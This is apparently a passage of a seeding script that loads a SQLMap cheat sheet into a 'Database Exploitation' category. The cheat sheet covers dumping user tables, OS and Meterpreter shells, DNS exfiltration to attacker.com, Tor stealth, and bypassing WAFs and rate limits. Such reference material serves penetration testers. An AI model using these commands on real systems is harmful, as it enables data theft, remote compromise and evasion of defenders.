Tries Boolean-based techniques for login bypass.

### Database Enumerate → Table → Column → Dump Workflow
\`\`\`bash
sqlmap -u target.com --dbs
sqlmap -u target.com -D site_db --tables
sqlmap -u target.com -D site_db -T users --dump
\`\`\`
**Description:**
Standard data retrieval workflow.

### MySQL → MSSQL → PostgreSQL → Oracle Specific Attacks
\`\`\`bash
sqlmap -u target.com --dbms=MySQL
\`\`\`
**Description:**
Manually specify DBMS type to optimize payloads.

### Large Table Chunk Dumping
\`\`\`bash
sqlmap -u target.com -D db -T logs --dump --start=1 --stop=100
\`\`\`
**Description:**
Retrieves only first 100 rows from a table with millions of rows.

### OS Shell Access
\`\`\`bash
sqlmap -u target.com --os-shell
\`\`\`
**Description:**
Gets shell via \`xp_cmdshell\` or \`UDF\` if DBA privileges exist.

### Trigger Reverse Shell
\`\`\`bash
sqlmap -u target.com --os-pwn --msf-path=/usr/share/metasploit-framework
\`\`\`
**Description:**
Opens Meterpreter session via Metasploit integration.

### Data Exfiltration via DNS
\`\`\`bash
sqlmap -u target.com --dns-domain=attacker.com
\`\`\`
**Description:**
Exfiltrates Blind SQLi data via DNS queries (Much faster).

### Injection Tests via Proxy/Burp
\`\`\`bash
sqlmap -u target.com --proxy=http://127.0.0.1:8080
\`\`\`
**Description:**
Route traffic through Burp Suite for manual analysis.

### Stealth SQLi over Tor
\`\`\`bash
sqlmap -u target.com --tor --check-tor --time-sec=10
\`\`\`
**Description:**
Stealth scan over Tor, timeout must be increased.

### Rate-Limit Bypass Techniques
\`\`\`bash
sqlmap -u target.com --delay=5 --safe-url="http://target.com/index.php" --safe-freq=5
\`\`\`
**Description:**
Visits main page every 5 requests to keep session alive and waits 5 seconds.

### Tamper Script Cascade
\`\`\`bash
sqlmap -u target.com --tamper="apostrophemask,apostrophenullencode,base64encode"
\`\`\`
**Description:**
Passes payload through multiple tamper scripts sequentially.

### Blind Injection Acceleration
\`\`\`bash
sqlmap -u target.com --technique=T --threads 10 --predict-output
\`\`\`
**Description:**
Speeds up blind injection using prediction algorithms and threading.

### SQLi Test on Parameters behind 2FA
\`\`\`bash
sqlmap -u target.com --cookie="PHPSESSID=valid_session; 2fa_token=valid_token"
\`\`\`
**Description:**
Test performed by providing valid session and token info in cookie.

### JSON Body Injection
\`\`\`bash
sqlmap -r json_request.txt
\`\`\`
**Description:**
Test using request file containing JSON formatted POST data.

## 8. Best Practices (Expert Level)

*   **Level/Risk**: Don't use \`--level 5 --risk 3\` unnecessarily, scan takes too long. Start with default (1).
*   **Tamper**: Don't try scripts randomly; try based on WAF type or logical order (e.g., space bypass -> quote bypass).
*   **Large-Table**: Increase \`--threads\` for large tables, but threads don't help with Time-based injection.
*   **File-Based Request**: Using \`-r\` prevents cookie and header mess, it's the most stable method.
*   **Proxy**: In suspicious cases, use \`--proxy\` to send traffic to Burp and visually check how payload is sent.
*   **Tor Timeout**: Increase \`--time-sec\` when using Tor, otherwise you get false negatives.
*   **Blind Delay**: Increase \`--time-sec\` if there is network latency.
*   **Heuristic**: Heuristic check can sometimes be wrong, verify manually.
*   **Output Cleanup**: Regularly clean \`~/.local/share/sqlmap/output\` folder or use \`--flush-session\`.
*   **Enum vs Dump**: Do \`--dbs\`, then \`--tables\`, then \`--dump\`. Don't ask for all at once.
*   **DB Specifics**: If target DBMS is known, always use \`--dbms\` parameter.

## 9. Common Mistakes

*   **Unnecessarily High Level**: Using \`--level 5\` for a simple GET parameter and waiting for hours.
*   **Wrong Endpoint**: Scanning a static page with no injection.
*   **CSRF Token**: Not using \`--csrf-token\` or \`--csrf-url\` on forms with CSRF tokens.
*   **Old Cookie**: Continuing scan with old cookie after session expired (Session expired error).
*   **Wrong Tamper**: Trying PHP tamper script on ASP.NET site.
*   **Forgetting Proxy**: Getting connection error when Proxy is on but Burp is off.
*   **Short Timeout**: Keeping timeout short in Blind injection and missing vulnerability.
*   **Dump at Once**: Trying to fetch 10GB table without \`--start/--stop\`.
*   **Faulty Raw Request**: Incorrectly copying empty lines in request file.
*   **Output Pollution**: New scan not seeing current data due to old session files (Need \`--flush-session\`).
*   **DBMS Misconception**: Trying MSSQL payloads on MySQL (If auto-detection fails).
`;

async function addSqlmap() {
    try {
        await dbConnect();
        console.log('Connected to DB. Adding SQLMap cheatsheet...');

        let category = await Category.findOne({ 'name.en': 'Database Exploitation' });
        if (!category) {
            console.log('Category "Database Exploitation" not found, creating...');
            category = await Category.create({
                name: { tr: 'Veritabanı Sömürü', en: 'Database Exploitation' },
                description: { tr: 'SQL Injection ve veritabanı saldırı araçları', en: 'SQL Injection and database attack tools' },
                slug: 'database-exploitation',
                icon: 'Database'
            });
        }

        const cheatsheetData = {
            title: {
                tr: 'SQLMap Cheat Sheet',
                en: 'SQLMap Cheat Sheet'
            },
            description: {
                tr: contentTR,
                en: contentEN
            },
            category: category._id,
            tags: ['sqlmap', 'sqli', 'sql-injection', 'database', 'exploit', 'waf-bypass', 'dump']
        };

        const result = await Cheatsheet.findOneAndUpdate(
            { 'title.en': 'SQLMap Cheat Sheet' },
            cheatsheetData,
            { upsert: true, new: true, setDefaultsOnInsert: true }
        );

        console.log('SQLMap cheatsheet added/updated successfully:', result.title);

    } catch (error) {
        console.error('Error:', error);
    } finally {
        await mongoose.disconnect();
    }
}

addSqlmap();
